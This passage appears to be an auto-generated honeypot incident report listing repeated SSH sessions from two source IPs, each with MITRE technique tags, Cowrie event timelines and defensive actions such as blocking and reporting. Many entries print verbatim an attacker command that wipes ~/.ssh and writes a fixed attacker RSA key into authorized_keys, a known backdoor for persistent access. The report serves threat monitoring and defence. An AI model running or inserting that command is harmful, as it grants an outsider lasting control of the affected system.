| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:04:46` | `cowrie.session.connect` |
| `2026-06-03 06:04:46` | `cowrie.client.version` |
| `2026-06-03 06:04:46` | `cowrie.client.kex` |
| `2026-06-03 06:04:46` | `cowrie.login.success` |
| `2026-06-03 06:04:46` | `cowrie.session.params` |
| `2026-06-03 06:04:46` | `cowrie.command.input` |
| `2026-06-03 06:04:46` | `cowrie.command.failed` |
| `2026-06-03 06:04:47` | `cowrie.log.closed` |
| `2026-06-03 06:04:47` | `cowrie.session.params` |
| `2026-06-03 06:04:47` | `cowrie.command.input` |
| `2026-06-03 06:04:47` | `cowrie.session.file_download` |
| `2026-06-03 06:04:47` | `cowrie.log.closed` |
| `2026-06-03 06:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4163ddad9c00

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:04 |
| **Last Seen** | 2026-06-03 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:04:49` | `cowrie.session.connect` |
| `2026-06-03 06:04:49` | `cowrie.client.version` |
| `2026-06-03 06:04:49` | `cowrie.client.kex` |
| `2026-06-03 06:04:49` | `cowrie.login.success` |
| `2026-06-03 06:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c8b566d718

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:06 |
| **Last Seen** | 2026-06-03 06:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:06:45` | `cowrie.session.connect` |
| `2026-06-03 06:06:45` | `cowrie.client.version` |
| `2026-06-03 06:06:45` | `cowrie.client.kex` |
| `2026-06-03 06:06:45` | `cowrie.login.success` |
| `2026-06-03 06:06:45` | `cowrie.session.params` |
| `2026-06-03 06:06:45` | `cowrie.command.input` |
| `2026-06-03 06:06:45` | `cowrie.command.failed` |
| `2026-06-03 06:06:46` | `cowrie.log.closed` |
| `2026-06-03 06:06:46` | `cowrie.session.params` |
| `2026-06-03 06:06:46` | `cowrie.command.input` |
| `2026-06-03 06:06:46` | `cowrie.session.file_download` |
| `2026-06-03 06:06:46` | `cowrie.log.closed` |
| `2026-06-03 06:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889f1f881dc4

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:06 |
| **Last Seen** | 2026-06-03 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:06:48` | `cowrie.session.connect` |
| `2026-06-03 06:06:48` | `cowrie.client.version` |
| `2026-06-03 06:06:48` | `cowrie.client.kex` |
| `2026-06-03 06:06:48` | `cowrie.login.success` |
| `2026-06-03 06:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85dcdf62f6f2

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:07 |
| **Last Seen** | 2026-06-03 06:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:07:10` | `cowrie.session.connect` |
| `2026-06-03 06:07:10` | `cowrie.client.version` |
| `2026-06-03 06:07:10` | `cowrie.client.kex` |
| `2026-06-03 06:07:11` | `cowrie.login.success` |
| `2026-06-03 06:07:12` | `cowrie.session.params` |
| `2026-06-03 06:07:12` | `cowrie.command.input` |
| `2026-06-03 06:07:12` | `cowrie.command.failed` |
| `2026-06-03 06:07:12` | `cowrie.log.closed` |
| `2026-06-03 06:07:13` | `cowrie.session.params` |
| `2026-06-03 06:07:13` | `cowrie.command.input` |
| `2026-06-03 06:07:13` | `cowrie.session.file_download` |
| `2026-06-03 06:07:13` | `cowrie.log.closed` |
| `2026-06-03 06:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10b42746ecd

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:07 |
| **Last Seen** | 2026-06-03 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:07:18` | `cowrie.session.connect` |
| `2026-06-03 06:07:18` | `cowrie.client.version` |
| `2026-06-03 06:07:18` | `cowrie.client.kex` |
| `2026-06-03 06:07:19` | `cowrie.login.success` |
| `2026-06-03 06:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c496f5ad3be2

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:08 |
| **Last Seen** | 2026-06-03 06:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:08:44` | `cowrie.session.connect` |
| `2026-06-03 06:08:44` | `cowrie.client.version` |
| `2026-06-03 06:08:44` | `cowrie.client.kex` |
| `2026-06-03 06:08:44` | `cowrie.login.success` |
| `2026-06-03 06:08:45` | `cowrie.session.params` |
| `2026-06-03 06:08:45` | `cowrie.command.input` |
| `2026-06-03 06:08:45` | `cowrie.command.failed` |
| `2026-06-03 06:08:45` | `cowrie.log.closed` |
| `2026-06-03 06:08:45` | `cowrie.session.params` |
| `2026-06-03 06:08:45` | `cowrie.command.input` |
| `2026-06-03 06:08:45` | `cowrie.session.file_download` |
| `2026-06-03 06:08:45` | `cowrie.log.closed` |
| `2026-06-03 06:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f630480554b

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:08 |
| **Last Seen** | 2026-06-03 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:08:47` | `cowrie.session.connect` |
| `2026-06-03 06:08:47` | `cowrie.client.version` |
| `2026-06-03 06:08:47` | `cowrie.client.kex` |
| `2026-06-03 06:08:48` | `cowrie.login.success` |
| `2026-06-03 06:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1cbc84cd678

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:09 |
| **Last Seen** | 2026-06-03 06:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:09:20` | `cowrie.session.connect` |
| `2026-06-03 06:09:20` | `cowrie.client.version` |
| `2026-06-03 06:09:20` | `cowrie.client.kex` |
| `2026-06-03 06:09:21` | `cowrie.login.success` |
| `2026-06-03 06:09:22` | `cowrie.session.params` |
| `2026-06-03 06:09:22` | `cowrie.command.input` |
| `2026-06-03 06:09:22` | `cowrie.command.failed` |
| `2026-06-03 06:09:23` | `cowrie.log.closed` |
| `2026-06-03 06:09:23` | `cowrie.session.params` |
| `2026-06-03 06:09:23` | `cowrie.command.input` |
| `2026-06-03 06:09:23` | `cowrie.session.file_download` |
| `2026-06-03 06:09:23` | `cowrie.log.closed` |
| `2026-06-03 06:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9159ed52d35b

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:09 |
| **Last Seen** | 2026-06-03 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:09:27` | `cowrie.session.connect` |
| `2026-06-03 06:09:27` | `cowrie.client.version` |
| `2026-06-03 06:09:27` | `cowrie.client.kex` |
| `2026-06-03 06:09:28` | `cowrie.login.success` |
| `2026-06-03 06:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b403adaf93

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:12 |
| **Last Seen** | 2026-06-03 06:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:12:46` | `cowrie.session.connect` |
| `2026-06-03 06:12:46` | `cowrie.client.version` |
| `2026-06-03 06:12:46` | `cowrie.client.kex` |
| `2026-06-03 06:12:47` | `cowrie.login.success` |
| `2026-06-03 06:12:47` | `cowrie.session.params` |
| `2026-06-03 06:12:47` | `cowrie.command.input` |
| `2026-06-03 06:12:47` | `cowrie.command.failed` |
| `2026-06-03 06:12:47` | `cowrie.log.closed` |
| `2026-06-03 06:12:47` | `cowrie.session.params` |
| `2026-06-03 06:12:47` | `cowrie.command.input` |
| `2026-06-03 06:12:47` | `cowrie.session.file_download` |
| `2026-06-03 06:12:47` | `cowrie.log.closed` |
| `2026-06-03 06:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c70069c6ab6

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:12 |
| **Last Seen** | 2026-06-03 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:12:49` | `cowrie.session.connect` |
| `2026-06-03 06:12:49` | `cowrie.client.version` |
| `2026-06-03 06:12:49` | `cowrie.client.kex` |
| `2026-06-03 06:12:50` | `cowrie.login.success` |
| `2026-06-03 06:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81b0bfbd2ccd

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:13 |
| **Last Seen** | 2026-06-03 06:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:13:50` | `cowrie.session.connect` |
| `2026-06-03 06:13:50` | `cowrie.client.version` |
| `2026-06-03 06:13:50` | `cowrie.client.kex` |
| `2026-06-03 06:13:52` | `cowrie.login.success` |
| `2026-06-03 06:13:52` | `cowrie.session.params` |
| `2026-06-03 06:13:52` | `cowrie.command.input` |
| `2026-06-03 06:13:52` | `cowrie.command.failed` |
| `2026-06-03 06:13:53` | `cowrie.log.closed` |
| `2026-06-03 06:13:53` | `cowrie.session.params` |
| `2026-06-03 06:13:53` | `cowrie.command.input` |
| `2026-06-03 06:13:54` | `cowrie.session.file_download` |
| `2026-06-03 06:13:54` | `cowrie.log.closed` |
| `2026-06-03 06:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d024a4b6c2

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:13 |
| **Last Seen** | 2026-06-03 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:13:57` | `cowrie.session.connect` |
| `2026-06-03 06:13:57` | `cowrie.client.version` |
| `2026-06-03 06:13:57` | `cowrie.client.kex` |
| `2026-06-03 06:13:59` | `cowrie.login.success` |
| `2026-06-03 06:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16193a187ce

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:18 |
| **Last Seen** | 2026-06-03 06:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:18:20` | `cowrie.session.connect` |
| `2026-06-03 06:18:20` | `cowrie.client.version` |
| `2026-06-03 06:18:21` | `cowrie.client.kex` |
| `2026-06-03 06:18:22` | `cowrie.login.success` |
| `2026-06-03 06:18:23` | `cowrie.session.params` |
| `2026-06-03 06:18:23` | `cowrie.command.input` |
| `2026-06-03 06:18:23` | `cowrie.command.failed` |
| `2026-06-03 06:18:23` | `cowrie.log.closed` |
| `2026-06-03 06:18:24` | `cowrie.session.params` |
| `2026-06-03 06:18:24` | `cowrie.command.input` |
| `2026-06-03 06:18:24` | `cowrie.session.file_download` |
| `2026-06-03 06:18:24` | `cowrie.log.closed` |
| `2026-06-03 06:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31ba5b80ede

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:18 |
| **Last Seen** | 2026-06-03 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:18:27` | `cowrie.session.connect` |
| `2026-06-03 06:18:27` | `cowrie.client.version` |
| `2026-06-03 06:18:28` | `cowrie.client.kex` |
| `2026-06-03 06:18:29` | `cowrie.login.success` |
| `2026-06-03 06:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba39a21c0d8f

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:20 |
| **Last Seen** | 2026-06-03 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:20:40` | `cowrie.session.connect` |
| `2026-06-03 06:20:40` | `cowrie.client.version` |
| `2026-06-03 06:20:40` | `cowrie.client.kex` |
| `2026-06-03 06:20:40` | `cowrie.login.success` |
| `2026-06-03 06:20:41` | `cowrie.session.params` |
| `2026-06-03 06:20:41` | `cowrie.command.input` |
| `2026-06-03 06:20:41` | `cowrie.command.failed` |
| `2026-06-03 06:20:41` | `cowrie.log.closed` |
| `2026-06-03 06:20:41` | `cowrie.session.params` |
| `2026-06-03 06:20:41` | `cowrie.command.input` |
| `2026-06-03 06:20:41` | `cowrie.session.file_download` |
| `2026-06-03 06:20:41` | `cowrie.log.closed` |
| `2026-06-03 06:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e296c7c3417

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:20 |
| **Last Seen** | 2026-06-03 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
